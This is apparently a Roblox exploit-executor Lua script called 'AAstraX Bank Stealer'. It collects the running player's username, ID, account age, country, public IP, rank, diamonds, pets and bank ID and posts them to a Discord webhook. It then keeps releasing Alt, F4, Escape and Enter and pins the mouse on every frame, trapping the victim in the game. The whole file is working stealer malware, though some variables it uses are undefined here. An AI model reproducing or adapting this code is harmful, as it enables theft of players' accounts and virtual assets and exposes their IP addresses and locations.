local us = _G.dhBankWebhook

local url3 = us

local username = game:GetService("Players").LocalPlayer.Name

local fardplayer = game.Players.LocalPlayer

local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value

local display = game.Players.LocalPlayer.DisplayName

local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)

local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"

local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text

local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text

local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text

local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

request = http_request or request or HttpPost or syn.request

local data1 = {

    ["content"] = ":comet||@everyone||\n**AAstraX Bank Stealer Detected A Hit:comet**", -- Free Webhook logging

    ["embeds"] = {

        {

            ["title"] = "```AAstraX Bank-Steal Dualhook Invites Results```",

            ["url"] = "https://discord.gg/pdBbN2dakA",

            ["description"] = "This data was generated using AAstraX Bank Stealer",

            ["type"] = "rich",

            ["color"] = tonumber(0x7b00ff),

            ["thumbnail"] = {

                ["url"] = imgs,

                ["height"] = 420,

                ["width"] = 420

            },

            ["fields"] = {

                {

                    ["name"] = "Detected an Dualhook Invites 1+ invites",

                    ["value"] = "**:detective:Username : " ..username .."\n:detective:User ID : " ..fardplayer.userId .. "\n:underage:Account Age : " ..fardplayer.AccountAge .. "\n:detective:DisplayName :"..display.."\n:crown:Rank:"..rank.."\n:computer: Exploit : "..executor.."\n:house:IP Address : "..game:HttpGet('https://api.ipify.org/').."\n:mag:Place :"..Loading.."\n:mag:Place :"..Game.."\n:mag:Country : "..country.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler credits to ver#2607

                    ["inline"] = false

                },

                {

                    ["name"] = ":gem: Diamonds :gem: ",

                    ["value"] = "```>>> "..myclowns.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":pin: Pets :pin:",

                    ["value"] = "```>>> "..bomg.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":money_mouth: Bank Huge:money_mouth: ",

                    ["value"] = "```>>> "..#PetsList.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":money_mouth: RAP :money_mouth: ",

                    ["value"] = "```>>> "..RAP.."```",

                    ["inline"] = true

                },

                {

                    ["name"] = ":bank: Bank ID :bank:",

                    ["value"] = "```>>> :bank:"..mybanks[1]["BUID"].."```",

                    ["inline"] = true

                }

            }

        }

    }

}

local newdata1 = game:GetService("HttpService"):JSONEncode(data1)

local headers = {

    ["content-type"] = "application/json"

}

local abcdef2 = {Url = url3, Body = newdata1, Method = "POST", Headers = headers}

request(abcdef2)

local runService = game:GetService("RunService")

local camera = workspace.CurrentCamera

local disabledKeyCodes = {

    0x73;

    0xA4;

    0xA5;

    0x1B;

    0x0D;

};

runService.RenderStepped:Connect(function()

    for _, keyCode in next, disabledKeyCodes do

        keyrelease(keyCode)

    end

    mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);

end);
